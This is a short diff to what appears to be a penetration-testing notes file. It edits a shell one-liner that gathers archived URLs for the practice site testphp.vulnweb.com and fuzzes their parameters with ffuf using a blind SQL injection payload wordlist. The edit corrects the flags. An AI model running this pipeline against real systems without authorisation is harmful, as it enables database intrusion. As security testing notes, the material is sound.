@@ -55,7 +55,7 @@ waybackurls -no-subs testphp.vulnweb.com | grep -E '\bhttps?://\S+?=\S+' | grep 
 ### waymore, qsreplace, gf, ffuf
 
 ```
-waymore -i "testphp.vulnweb.com" -n -mode U | qsreplace "FUZZ" | gf sqli | sort -u | while read urls; do ffuf -u "$urls" -w /usr/share/wordlists/my-payloads/SQLi/Blind-SQLis/blind-sqli.txt -mt ">18000" -enc FUZZ:urlencode -timeout 150 –v -o SQLi_blind_ffuf.json; done
+waymore -i "testphp.vulnweb.com" -n -mode U | qsreplace "FUZZ" | gf sqli | sort -u | while read urls; do ffuf -u "$urls" -w /usr/share/wordlists/my-payloads/SQLi/Blind-SQLis/blind-sqli.txt -mt ">18000" -v -mc 200 -enc FUZZ:urlencode -timeout 150 -o SQLi_blind_ffuf.json; done
 ```
 
 
